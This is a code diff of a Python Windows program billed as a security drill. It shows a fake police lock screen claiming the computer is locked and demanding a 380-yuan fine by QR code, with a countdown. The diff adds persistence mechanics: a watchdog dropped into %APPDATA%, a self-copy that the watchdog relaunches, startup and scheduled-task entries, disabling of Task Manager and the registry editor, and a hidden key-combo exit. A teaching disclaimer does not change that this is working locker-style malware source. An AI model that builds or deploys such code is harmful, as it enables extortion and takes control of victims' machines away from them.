@@ -4,12 +4,13 @@
 ========================================================
 功能：
     - 首次运行释放 watchdog.exe 到 %APPDATA%\SecurityDemo，启动后退出
-    - watchdog 负责持续监控并拉起主程序
+    - watchdog 负责持续监控并拉起主程序副本
     - 主程序具备开机自启、计划任务、禁用任务管理器/注册表等粘性功能
     - 退出方式：Ctrl+Shift+Q 连续 3 次（ESC 已移除）
     - 左上角徽章支持图片（badge.png）
     - 自定义弹窗支持图片（info.png），无标题栏
     - 控制台仅显示启动信息，详细日志写入文件
+⚠️ 仅用于网络安全教学演练，禁止恶意使用
 """
 import sys
 import os
@@ -25,16 +26,19 @@ import tkinter as tk
 from tkinter import messagebox
 from datetime import datetime, timedelta
 from pathlib import Path
+
 # 尝试导入 PIL（用于 PNG 图片支持）
 try:
     from PIL import Image, ImageTk
     PIL_AVAILABLE = True
 except ImportError:
     PIL_AVAILABLE = False
+
 # ============================================================
 # 日志系统（控制台仅显示启动信息，详细日志写入文件）
 # ============================================================
 _log_file = None
+
 def init_log():
     """初始化日志文件（在程序启动时调用）"""
     global _log_file
@@ -78,6 +82,7 @@ def log(msg, console=None):
         console = not ('✅' in msg or '❌' in msg)
     if console:
         print(full_msg)
+
 # ============================================================
 # 配置 【仅调大面板尺寸，其余颜色常量保持原样】
 # ============================================================
@@ -91,6 +96,7 @@ DARK_RED = "#A00000"
 BLUE = "#0808E8"
 GRAY = "#D3D3D3"
 GREEN = "#008A00"
+
 # ============================================================
 # 工具函数
 # ============================================================
@@ -133,6 +139,7 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     except:
         return False
+
 # ============================================================
 # Windows 系统修改功能
 # ============================================================
@@ -259,8 +266,9 @@ class WindowsPersistence:
             log("✅ 已恢复注册表编辑器", console=False)
         except:
             pass
+
 # ============================================================
-# 【修复版】释放并启动 watchdog
+# 【修复版】释放并启动 watchdog（解决onefile _MEIPASS销毁问题）
 # ============================================================
 def release_and_launch_watchdog():
     """释放内嵌的 watchdog.exe 到 %APPDATA%\SecurityDemo 持久目录并启动，返回是否成功"""
@@ -280,31 +288,28 @@ def release_and_launch_watchdog():
         log("警告：未找到内嵌 watchdog.exe，跳过守护启动", console=False)
         return False
 
-    # 使用APPDATA持久目录，避免系统临时目录被清理
     appdata = os.getenv("APPDATA")
     if not appdata:
         log("错误：无法获取APPDATA环境变量", console=False)
         return False
     target_dir = os.path.join(appdata, "SecurityDemo")
     os.makedirs(target_dir, exist_ok=True)
+
     target_watchdog = os.path.join(target_dir, "watchdog.exe")
     log(f"watchdog目标释放路径: {target_watchdog}", console=False)
 
     try:
         src_size = os.path.getsize(src_watchdog)
-        # 判断是否需要覆盖：文件不存在 或者 文件大小不一致
         need_copy = True
         if os.path.exists(target_watchdog):
             dst_size = os.path.getsize(target_watchdog)
             if dst_size == src_size:
                 need_copy = False
                 log("watchdog本地文件已存在且大小一致，跳过复制", console=False)
-
         if need_copy:
             shutil.copy(src_watchdog, target_watchdog)
             log("watchdog.exe复制完成", console=False)
 
-        # 二次校验复制结果
         if not os.path.exists(target_watchdog):
             log("错误：复制完成，但目标watchdog.exe不存在", console=False)
             return False
@@ -312,13 +317,23 @@ def release_and_launch_watchdog():
             log("错误：watchdog.exe复制后大小不匹配，文件损坏", console=False)
             return False
 
+        # ==========关键修复：复制自身到持久目录，watchdog监控副本，规避_MEIPASS删除==========
+        main_exe_src = sys.executable
+        main_exe_dst = os.path.join(target_dir, "main.exe")
+        log(f"复制主程序自身到持久目录 {main_exe_dst}", console=False)
+        src_main_size = os.path.getsize(main_exe_src)
+        if not (os.path.exists(main_exe_dst) and os.path.getsize(main_exe_dst) == src_main_size):
+            shutil.copy(main_exe_src, main_exe_dst)
+            log("主程序副本复制完成", console=False)
+
+        launch_target_exe = main_exe_dst
+        # ==========end==========
+
         # 构造 watchdog 启动参数
-        current_exe = sys.executable
-        cmd = [target_watchdog, '--target', current_exe]
+        cmd = [target_watchdog, '--target', launch_target_exe]
         if '--persist' in sys.argv or '-p' in sys.argv:
             cmd.append('--persist')
 
-        # 启动 watchdog，无窗口
         subprocess.Popen(
             cmd,
             creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
@@ -342,6 +357,7 @@ def resource_path(relative_path):
     except Exception:
         base_path = os.path.abspath(".")
     return os.path.join(base_path, relative_path)
+
 # ============================================================
 # 主 UI 类
 # ============================================================
@@ -369,6 +385,7 @@ class SecurityDemoUI:
         self.countdown_end = datetime.now() + timedelta(hours=72)
         self.exit_count = 0
         self.last_exit_press = 0
+
         # 启动信息输出到控制台（同时写入文件）
         log("======================================")
         log(f"启动时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
@@ -379,6 +396,7 @@ class SecurityDemoUI:
         log("罚款支付：扫描二维码")
         log(f"进程守护：{'启用' if self.enable_persistence else '禁用'}")
         log(f"管理员权限：{'是' if self.is_admin else '否'}")
+
         # 构建 UI
         self.build_gui()
         # 启动实时更新
@@ -392,9 +410,7 @@ class SecurityDemoUI:
             self.apply_persistence()
         # 窗口关闭事件（清理）
         self.root.protocol("WM_DELETE_WINDOW", self.safe_exit)
-    # ============================================================
-    # GUI 构建（优化布局，加大容器、边距，解决文字截断）
-    # ============================================================
+
     def build_gui(self):
         # 主背景
         bg = tk.Frame(self.root, bg=WINDOW_BG)
@@ -428,12 +444,10 @@ class SecurityDemoUI:
         # --- 左侧徽章（支持图片，若图片不存在则绘制五角星） ---
         badge_container = tk.Frame(top, bg=WHITE, width=190, height=190)
         badge_container.place(x=8, y=4)
-        # 尝试加载 badge.png
         badge_img_path = resource_path("badge.png")
         if os.path.exists(badge_img_path) and PIL_AVAILABLE:
             try:
                 img = Image.open(badge_img_path)
-                # 缩放至合适大小（保持宽高比）
                 img.thumbnail((170, 170))
                 self.badge_photo = ImageTk.PhotoImage(img)
                 lbl = tk.Label(badge_container, image=self.badge_photo, bg=WHITE)
@@ -460,16 +474,12 @@ class SecurityDemoUI:
                                                          RED if self.enable_persistence else GREEN)
 
     def _draw_star_badge(self, container):
-        """绘制五角星徽章（后备方案）"""
         canvas = tk.Canvas(container, width=190, height=190, bg=WHITE, highlightthickness=0)
         canvas.pack()
-        # 外圈
         canvas.create_oval(8, 8, 182, 182, fill="#E3E3E3", outline="#B0B0B0", width=2)
         canvas.create_oval(18, 18, 172, 172, fill="#E6C900", outline="#9B8700", width=2)
         canvas.create_oval(32, 32, 158, 158, fill="#D51920", outline="#A30000", width=2)
-        # 大星星
         self._draw_star(canvas, 95, 66, 28, "#FFD900")
-        # 小星星
         for x, y, r in [(58, 88, 10), (132, 88, 10), (68, 118, 9), (122, 118, 9)]:
             self._draw_star(canvas, x, y, r, "#FFD900")
         canvas.create_text(95, 142, text="安全演练", font=("Microsoft YaHei", 16, "bold"), fill="#FFD900")
@@ -496,7 +506,6 @@ class SecurityDemoUI:
     def create_body(self):
         body = tk.Frame(self.panel, bg=WHITE)
         body.place(x=24, y=220, width=PANEL_WIDTH - 48, height=600)
-        # 警告条
         tk.Frame(body, bg="#BBBBEE").place(x=20, y=20, width=480, height=130)
         canvas = tk.Canvas(body, width=480, height=130, bg=WHITE, highlightthickness=0)
         canvas.place(x=8, y=8)
@@ -504,14 +513,12 @@ class SecurityDemoUI:
         canvas.create_rectangle(240, 8, 472, 122, fill=BLUE, outline="")
         canvas.create_text(240, 65, text="你的电脑已被锁定！",
                            font=("Microsoft YaHei", 30, "bold"), fill=WHITE)
-        # 标题
         tk.Label(body, text=f"执行编号：{self.demo_id}",
                  font=("Microsoft YaHei", 28, "bold"), bg=WHITE, fg="#006000", anchor="w").place(x=520, y=18)
         tk.Label(body, text="你被罚款", font=("Microsoft YaHei", 38, "bold"),
                  bg=WHITE, fg=BLACK, anchor="w").place(x=520, y=70)
         tk.Label(body, text="380元", font=("Microsoft YaHei", 34, "bold"),
                  bg=WHITE, fg=DARK_RED, anchor="w").place(x=780, y=68)
-        # 正文
         text = (
             "您因多次访问包含中华人民共和国法律禁止的内容\n"
             "\n"
@@ -524,12 +531,10 @@ class SecurityDemoUI:
         )
         tk.Label(body, text=text, font=("Microsoft YaHei", 16),
                  bg=WHITE, fg="#111111", justify="left", wraplength=1150).place(x=16, y=160, width=1150, height=190)
-        # 按钮
         tk.Frame(body, bg="#D0D0D0").place(x=510, y=360, width=280, height=78)
         tk.Button(body, text="缴纳罚款", font=("Microsoft YaHei", 19, "bold"),
                   fg=WHITE, bg="#9D0000", activeforeground=WHITE, activebackground="#CC0000",
                   relief="flat", bd=0, command=self.show_demo_info).place(x=504, y=354, width=280, height=78)
-        # 底部提示
         tk.Label(body, text="支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！", font=("Microsoft YaHei", 20, "bold"),
                  bg=WHITE, fg=DARK_RED).place(x=0, y=450, width=1220, height=38)
         notice = (
@@ -538,18 +543,14 @@ class SecurityDemoUI:
         )
         tk.Label(body, text=notice, font=("Microsoft YaHei", 14),
                  bg=WHITE, fg=DARK_RED, justify="center", wraplength=1180).place(x=24, y=495, width=1170, height=95)
-        # 倒计时
         tk.Label(body, text="演练计时：", font=("Microsoft YaHei", 15, "bold"),
                  bg=WHITE, fg=BLACK).place(x=500, y=595)
         self.countdown_label = tk.Label(body, text="72:00:00", font=("Consolas", 22, "bold"),
                                         bg=WHITE, fg=DARK_RED)
         self.countdown_label.place(x=610, y=592)
-        # 退出提示
         tk.Label(body, text="第0945‑I3467361778号罚款",
                  font=("Microsoft YaHei", 10), bg=WHITE, fg="#777777").place(x=0, y=645, width=1220)
-    # ============================================================
-    # 实时更新
-    # ============================================================
+
     def update_live_info(self):
         try:
             self.local_ip = get_local_ip()
@@ -570,29 +571,22 @@ class SecurityDemoUI:
         mins, secs = divmod(rem, 60)
         self.countdown_label.config(text=f"{hours:02d}:{mins:02d}:{secs:02d}")
         self.root.after(1000, self.update_countdown)
-    # ============================================================
-    # 自定义弹窗（支持图片，无标题栏）弹窗同步放大
-    # ============================================================
+
     def show_demo_info(self):
-        """自定义弹窗，包含图片和文字，无标题栏"""
         popup = tk.Toplevel(self.root)
-        popup.title("")  # 空标题
-        popup.overrideredirect(True)          # 去掉标题栏
+        popup.title("")
+        popup.overrideredirect(True)
         popup.attributes("-topmost", True)
         popup.configure(bg=WHITE)
-        # 窗口居中 放大弹窗尺寸
         pw, ph = 620, 440
         sw = self.root.winfo_screenwidth()
         sh = self.root.winfo_screenheight()
         x = (sw - pw) // 2
         y = (sh - ph) // 2
         popup.geometry(f"{pw}x{ph}+{x}+{y}")
-        # 红色边框（模仿主界面风格）
         popup.configure(highlightbackground=RED, highlightthickness=4)
-        # ---- 内容 ----
         content_frame = tk.Frame(popup, bg=WHITE)
         content_frame.pack(fill="both", expand=True, padx=22, pady=22)
-        # 尝试加载 info.png
         info_img_path = resource_path("info.png")
         img_label = None
         if os.path.exists(info_img_path) and PIL_AVAILABLE:
@@ -601,11 +595,10 @@ class SecurityDemoUI:
                 img.thumbnail((240, 180))
                 photo = ImageTk.PhotoImage(img)
                 img_label = tk.Label(content_frame, image=photo, bg=WHITE)
-                img_label.image = photo  # 保持引用
+                img_label.image = photo
                 img_label.pack(pady=(0,14))
             except Exception as e:
                 log(f"⚠️ 弹窗图片加载失败: {e}", console=False)
-        # 文字说明
         info_text = (
             f"网络安全说明\n\n"
             f"执行编号：{self.demo_id}\n"
@@ -618,16 +611,12 @@ class SecurityDemoUI:
         lbl = tk.Label(content_frame, text=info_text, font=("Microsoft YaHei", 14),
                        bg=WHITE, fg=BLACK, justify="center")
         lbl.pack(pady=8)
-        # 确定按钮
         btn = tk.Button(content_frame, text="确 定", font=("Microsoft YaHei", 14, "bold"),
                         bg="#9D0000", fg=WHITE, relief="flat", bd=0,
                         command=popup.destroy, width=14, height=1)
         btn.pack(pady=16)
-        # 点击窗口外部不会关闭，必须点按钮
         popup.focus_set()
-    # ============================================================
-    # 粘性功能应用与清理
-    # ============================================================
+
     def apply_persistence(self):
         exe_path = sys.executable
         WindowsPersistence.add_startup(exe_path)
@@ -641,10 +630,22 @@ class SecurityDemoUI:
         WindowsPersistence.remove_scheduled_task()
         WindowsPersistence.enable_taskmgr()
         WindowsPersistence.enable_regedit()
+
+        # 清理APPDATA目录下生成的watchdog与main副本
+        appdata = os.getenv("APPDATA")
+        if appdata:
+            target_dir = os.path.join(appdata, "SecurityDemo")
+            try:
+                watchdog_path = os.path.join(target_dir, "watchdog.exe")
+                main_copy = os.path.join(target_dir, "main.exe")
+                if os.path.exists(watchdog_path):
+                    os.remove(watchdog_path)
+                if os.path.exists(main_copy):
+                    os.remove(main_copy)
+            except Exception as e:
+                log(f"清理副本文件异常 {e}", console=False)
         log("✅ 清理完成", console=False)
-    # ============================================================
-    # 退出逻辑（仅 Ctrl+Shift+Q 三次）
-    # ============================================================
+
     def exit_shortcut(self, event=None):
         now = time.time()
         if now - self.last_exit_press > 2.0:
@@ -661,7 +662,6 @@ class SecurityDemoUI:
             self.cleanup_persistence()
         self.root.destroy()
         log("程序已退出")
-        # 关闭日志文件
         global _log_file
         if _log_file:
             try:
@@ -669,22 +669,18 @@ class SecurityDemoUI:
             except:
                 pass
         sys.exit(0)
-    # ============================================================
-    # 运行
-    # ============================================================
+
     def run(self):
         self.root.mainloop()
+
 # ============================================================
 # 主入口
 # ============================================================
 def main():
-    # 初始化日志系统（先于任何 log 调用）
     init_log()
-    # 如果当前不是由 watchdog 启动，则释放并启动 watchdog
     if os.environ.get('WATCHDOG_LAUNCHED') != '1':
         if release_and_launch_watchdog():
-            sys.exit(0)  # 原进程退出，由 watchdog 接管
-    # 正常启动 UI
+            sys.exit(0)
     enable_persistence = '--persist' in sys.argv or '-p' in sys.argv
     app = SecurityDemoUI(enable_persistence=enable_persistence)
     app.run()
